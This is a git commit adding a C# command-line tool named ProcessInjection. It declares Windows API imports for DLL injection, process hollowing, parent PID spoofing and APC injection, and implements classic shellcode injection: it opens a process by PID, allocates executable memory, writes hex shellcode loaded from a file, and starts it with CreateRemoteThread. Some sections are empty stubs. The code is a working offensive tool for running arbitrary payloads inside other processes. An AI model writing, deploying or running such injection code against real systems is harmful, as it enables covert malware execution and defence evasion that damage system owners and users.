3aa6faf6d0af6bf38463069f1f88cd11f299050d
Hiển Nguyễn Minh <nguyenminhhien2112@gmail.com>
2021-06-01 16:58:17 +0700

    Initial commit

---
+++ ProcessInjection/Program.cs
@@ -0,0 +1,434 @@
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Runtime.InteropServices;
+using System.Security.Principal;
+using System.Diagnostics;
+using System.Threading;
+using System.IO;
+using System.Security.Cryptography;
+using System.Net;
+
+namespace ProcessInjection
+{
+    class Program
+    {
+        [DllImport("Kernel32", SetLastError = true)]
+        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
+
+        [DllImport("Kernel32", SetLastError = true)]
+        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+        [DllImport("Kernel32", SetLastError = true)]
+        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [MarshalAs(UnmanagedType.AsAny)] object lpBuffer, uint nSize, ref uint lpNumberOfBytesWritten);
+
+        [DllImport("Kernel32", SetLastError = true)]
+        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, ref uint lpThreadId);
+
+        [DllImport("Kernel32", SetLastError = true)]
+        static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
+
+        [DllImport("Kernel32", SetLastError = true)]
+        static extern bool CloseHandle(IntPtr hObject);
+
+        #region DLL Injection
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern IntPtr GetModuleHandleA(string lpModuleName);
+
+        [DllImport("kernel32", SetLastError = true)]
+        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+        #endregion DLL Injection
+
+        #region Process Hollowing
+        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
+        private static extern int ZwCreateSection(ref IntPtr section, uint desiredAccess, IntPtr pAttrs, ref LARGE_INTEGER pMaxSize, uint pageProt, uint allocationAttribs, IntPtr hFile);
+
+        [DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall)]
+        private static extern void GetSystemInfo(ref SYSTEM_INFO lpSysInfo);
+
+        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
+        private static extern int ZwMapViewOfSection(IntPtr section, IntPtr process, ref IntPtr baseAddr, IntPtr zeroBits, IntPtr commitSize, IntPtr stuff, ref IntPtr viewSize, int inheritDispo, uint alloctype, uint prot);
+
+        [DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall)]
+        private static extern IntPtr GetCurrentProcess();
+
+        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
+        public static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
+
+        [DllImport("kernel32.dll", SetLastError = true, CallingConvention = CallingConvention.StdCall)]
+        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, IntPtr nSize, out IntPtr lpNumWritten);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern uint ResumeThread(IntPtr hThread);
+
+        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
+        private static extern int ZwUnmapViewOfSection(IntPtr hSection, IntPtr address);
+
+        [DllImport("Kernel32.dll", SetLastError = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
+        private static extern bool CreateProcess(IntPtr lpApplicationName, string lpCommandLine, IntPtr lpProcAttribs, IntPtr lpThreadAttribs, bool bInheritHandles, uint dwCreateFlags, IntPtr lpEnvironment, IntPtr lpCurrentDir, [In] ref STARTUPINFO lpStartinfo, out PROCESS_INFORMATION lpProcInformation);
+
+        [DllImport("kernel32.dll")]
+        static extern uint GetLastError();
+        #endregion Process Hollowing
+
+        #region Parent PID Spoofing
+        [DllImport("kernel32.dll")]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        private static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        private static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern bool SetHandleInformation(IntPtr hObject, HANDLE_FLAGS dwMask, HANDLE_FLAGS dwFlags);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        static extern bool DuplicateHandle(IntPtr hSourceProcessHandle, IntPtr hSourceHandle, IntPtr hTargetProcessHandle, ref IntPtr lpTargetHandle, uint dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwOptions);
+        #endregion Parent PID Spoofing
+
+        #region APC Injection
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle, uint dwThreadId);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);
+
+        #endregion APC Injection
+
+        //https://www.pinvoke.net/default.aspx/kernel32.openthread
+        [Flags]
+        public enum ThreadAccess : int
+        {
+            TERMINATE = (0x0001),
+            SUSPEND_RESUME = (0x0002),
+            GET_CONTEXT = (0x0008),
+            SET_CONTEXT = (0x0010),
+            SET_INFORMATION = (0x0020),
+            QUERY_INFORMATION = (0x0040),
+            SET_THREAD_TOKEN = (0x0080),
+            IMPERSONATE = (0x0100),
+            DIRECT_IMPERSONATION = (0x0200),
+            THREAD_HIJACK = SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT,
+            THREAD_ALL = TERMINATE | SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT | SET_INFORMATION | QUERY_INFORMATION | SET_THREAD_TOKEN | IMPERSONATE | DIRECT_IMPERSONATION
+        }
+
+        //http://www.pinvoke.net/default.aspx/kernel32/OpenProcess.html
+        public enum ProcessAccessRights
+        {
+            All = 0x001F0FFF,
+            Terminate = 0x00000001,
+            CreateThread = 0x00000002,
+            VirtualMemoryOperation = 0x00000008,
+            VirtualMemoryRead = 0x00000010,
+            VirtualMemoryWrite = 0x00000020,
+            DuplicateHandle = 0x00000040,
+            CreateProcess = 0x000000080,
+            SetQuota = 0x00000100,
+            SetInformation = 0x00000200,
+            QueryInformation = 0x00000400,
+            QueryLimitedInformation = 0x00001000,
+            Synchronize = 0x00100000
+        }
+
+        //https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
+        public enum MemAllocation
+        {
+            MEM_COMMIT = 0x00001000,
+            MEM_RESERVE = 0x00002000,
+            MEM_RESET = 0x00080000,
+            MEM_RESET_UNDO = 0x1000000,
+            SecCommit = 0x08000000
+        }
+
+        //https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants
+        public enum MemProtect
+        {
+            PAGE_EXECUTE = 0x10,
+            PAGE_EXECUTE_READ = 0x20,
+            PAGE_EXECUTE_READWRITE = 0x40,
+            PAGE_EXECUTE_WRITECOPY = 0x80,
+            PAGE_NOACCESS = 0x01,
+            PAGE_READONLY = 0x02,
+            PAGE_READWRITE = 0x04,
+            PAGE_WRITECOPY = 0x08,
+            PAGE_TARGETS_INVALID = 0x40000000,
+            PAGE_TARGETS_NO_UPDATE = 0x40000000,
+        }
+
+        // https://docs.microsoft.com/en-us/windows/win32/procthread/thread-security-and-access-rights
+  
+
+        #region Parent PID Spoofing Structs and flags
+        // Parent PID Spoofing flags - https://www.pinvoke.net/default.aspx/kernel32.sethandleinformation
+        enum HANDLE_FLAGS : uint
+        {
+            None = 0,
+            INHERIT = 1,
+            PROTECT_FROM_CLOSE = 2
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct SECURITY_ATTRIBUTES
+        {
+            public int nLength;
+            public IntPtr lpSecurityDescriptor;
+            [MarshalAs(UnmanagedType.Bool)]
+            public bool bInheritHandle;
+        }
+
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+        struct STARTUPINFOEX
+        {
+            public STARTUPINFO StartupInfo;
+            public IntPtr lpAttributeList;
+        }
+        #endregion Parent PID Spoofing structs and flags
+
+        #region Process Hollowing Structs
+        [StructLayout(LayoutKind.Sequential)]
+        public struct PROCESS_INFORMATION
+        {
+            public IntPtr hProcess;
+            public IntPtr hThread;
+            public int dwProcessId;
+            public int dwThreadId;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        internal struct PROCESS_BASIC_INFORMATION
+        {
+            public IntPtr Reserved1;
+            public IntPtr PebAddress;
+            public IntPtr Reserved2;
+            public IntPtr Reserved3;
+            public IntPtr UniquePid;
+            public IntPtr MoreReserved;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        //internal struct STARTUPINFO
+        public struct STARTUPINFO
+        {
+            uint cb;
+            IntPtr lpReserved;
+            IntPtr lpDesktop;
+            IntPtr lpTitle;
+            uint dwX;
+            uint dwY;
+            uint dwXSize;
+            uint dwYSize;
+            uint dwXCountChars;
+            uint dwYCountChars;
+            uint dwFillAttributes;
+            public uint dwFlags;
+            public ushort wShowWindow;
+            ushort cbReserved;
+            IntPtr lpReserved2;
+            IntPtr hStdInput;
+            IntPtr hStdOutput;
+            IntPtr hStdErr;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct SYSTEM_INFO
+        {
+            public uint dwOem;
+            public uint dwPageSize;
+            public IntPtr lpMinAppAddress;
+            public IntPtr lpMaxAppAddress;
+            public IntPtr dwActiveProcMask;
+            public uint dwNumProcs;
+            public uint dwProcType;
+            public uint dwAllocGranularity;
+            public ushort wProcLevel;
+            public ushort wProcRevision;
+        }
+
+        [StructLayout(LayoutKind.Sequential, Pack = 1)]
+        public struct LARGE_INTEGER
+        {
+            public uint LowPart;
+            public int HighPart;
+        }
+        #endregion End of Process Hollowing Structs
+        public static byte[] StringToByteArray(string hex)
+        {
+            return Enumerable.Range(0, hex.Length)
+                             .Where(x => x % 2 == 0)
+                             .Select(x => Convert.ToByte(hex.Substring(x, 2), 16))
+                             .ToArray();
+        }
+        public static void CodeInject(int pid, byte[] buf)
+        {
+            try
+            {
+                uint lpNumberOfBytesWritten = 0;
+                uint lpThreadId = 0;
+                PrintInfo($"[!] Obtaining the handle for the process id {pid}.");
+                IntPtr pHandle = OpenProcess((uint)ProcessAccessRights.All, false, (uint)pid);
+                PrintInfo($"[!] Handle {pHandle} opened for the process id {pid}.");
+                PrintInfo($"[!] Allocating memory to inject the shellcode.");
+                IntPtr rMemAddress = VirtualAllocEx(pHandle, IntPtr.Zero, (uint)buf.Length, (uint)MemAllocation.MEM_RESERVE | (uint)MemAllocation.MEM_COMMIT, (uint)MemProtect.PAGE_EXECUTE_READWRITE);
+                PrintInfo($"[!] Memory for injecting shellcode allocated at 0x{rMemAddress}.");
+                PrintInfo($"[!] Writing the shellcode at the allocated memory location.");
+                if (WriteProcessMemory(pHandle, rMemAddress, buf, (uint)buf.Length, ref lpNumberOfBytesWritten))
+                {
+                    PrintInfo($"[!] Shellcode written in the process memory.");
+                    PrintInfo($"[!] Creating remote thread to execute the shellcode.");
+                    IntPtr hRemoteThread = CreateRemoteThread(pHandle, IntPtr.Zero, 0, rMemAddress, IntPtr.Zero, 0, ref lpThreadId);
+                    bool hCreateRemoteThreadClose = CloseHandle(hRemoteThread);
+                    PrintSuccess($"[+] Sucessfully injected the shellcode into the memory of the process id {pid}.");
+                }
+                else
+                {
+                    PrintError($"[-] Failed to write the shellcode into the memory of the process id {pid}.");
+                }
+                //WaitForSingleObject(hRemoteThread, 0xFFFFFFFF);
+                bool hOpenProcessClose = CloseHandle(pHandle);
+            }
+            catch (Exception ex)
+            {
+                PrintError("[-] " + Marshal.GetExceptionCode());
+                PrintError(ex.Message);
+            }
+        }
+            const int AttributeSize = 24;
+        public class ParentPidSpoofing
+        {
+            // https://stackoverflow.com/questions/10554913/how-to-call-createprocess-with-startupinfoex-from-c-sharp-and-re-parent-the-ch
+
+            public int SearchForPPID(string process)
+            {
+                int pid = 0;
+                int session = Process.GetCurrentProcess().SessionId;
+                Process[] allprocess = Process.GetProcessesByName(process);
+
+                try
+                {
+                    foreach (Process proc in allprocess)
+                    {
+                        if (proc.SessionId == session)
+                        {
+                            pid = proc.Id;
+                            PrintInfo($"[!] Parent process ID found: {pid}.");
+                        }
+                    }
+                }
+                catch (Exception ex)
+                {
+                    PrintError("[-] " + Marshal.GetExceptionCode());
+                    PrintError(ex.Message);
+                }
+                return pid;
+            }
+
+          
+        }
+
+       
+        #region DynamicInvoke
+
+        #endregion DynamicInvoke
+
+       
+
+        public static void PrintError(string error)
+        {
+            Console.ForegroundColor = ConsoleColor.Red;
+            Console.WriteLine(error);
+            Console.ResetColor();
+        }
+
+        public static void PrintSuccess(string success)
+        {
+            Console.ForegroundColor = ConsoleColor.Green;
+            Console.WriteLine(success);
+            Console.ResetColor();
+        }
+        public static void PrintInfo(string info)
+        {
+            Console.ForegroundColor = ConsoleColor.Blue;
+            Console.WriteLine(info);
+            Console.ResetColor();
+        }
+
+        public static void PrintTitle(string title)
+        {
+            Console.ForegroundColor = ConsoleColor.Gray;
+            Console.WriteLine(title);
+            Console.ResetColor();
+        }
+
+        static void Main(string[] args)
+        {
+            try
+            {
+                // https://github.com/GhostPack/Rubeus/blob/master/Rubeus/Domain/ArgumentParser.cs#L10
+
+                var arguments = new Dictionary<string, string>();
+                foreach (var argument in args)
+                {
+                    var idx = argument.IndexOf(':');
+                    if (idx > 0)
+                        arguments[argument.Substring(0, idx)] = argument.Substring(idx + 1);
+                    else
+                        arguments[argument] = string.Empty;
+                }
+
+                WindowsIdentity identity = WindowsIdentity.GetCurrent();
+                WindowsPrincipal principal = new WindowsPrincipal(identity);
+                if (principal.IsInRole(WindowsBuiltInRole.Administrator))               
+                    PrintInfo($"[!] Process running with {principal.Identity.Name} privileges with HIGH integrity.");     
+               else
+                    PrintInfo($"[!] Process running with {principal.Identity.Name} privileges with MEDIUM / LOW integrity.");
+
+                if (arguments.Count == 0)     
+                    PrintError("[-] No arguments specified. Please refer the help section for more details."); 
+                else if (arguments.Count < 2)             
+                    PrintError("[-] Some arguments are missing. Please refer the help section for more details.");
+                else if (arguments.Count >= 2)
+                {
+                    int procid = 0;
+                    ParentPidSpoofing Parent = new ParentPidSpoofing();
+
+                    string shellcode = null;
+                    byte[] rawshellcode = new byte[] { };
+                    byte[] dllbuf = new byte[] { };
+
+                    if (arguments.ContainsKey("/pid"))
+                    {
+                        procid = Convert.ToInt32(arguments["/pid"]);
+                        Process process = Process.GetProcessById(procid);
+                    }
+
+                    if (arguments.ContainsKey("/path") && System.IO.File.Exists(arguments["/path"]))
+                        shellcode = System.IO.File.ReadAllText(arguments["/path"]);
+                    byte[] xorshellcode = new byte[] { };
+                    byte[] aesshellcode = new byte[] { };
+                    byte[] buf = new byte[] { };
+                    buf = StringToByteArray(shellcode);
+                    PrintTitle($"[>>] Vanilla Process Injection Technique.");
+                    CodeInject(procid, buf);
+                }
+                else
+                {
+                    PrintError("[-] Invalid argument. Please refer the help section for more details.");               
+                }
+            }
+            catch (Exception ex)
+            {
+                PrintError(ex.Message);
+            }
+        }
+    }
+}
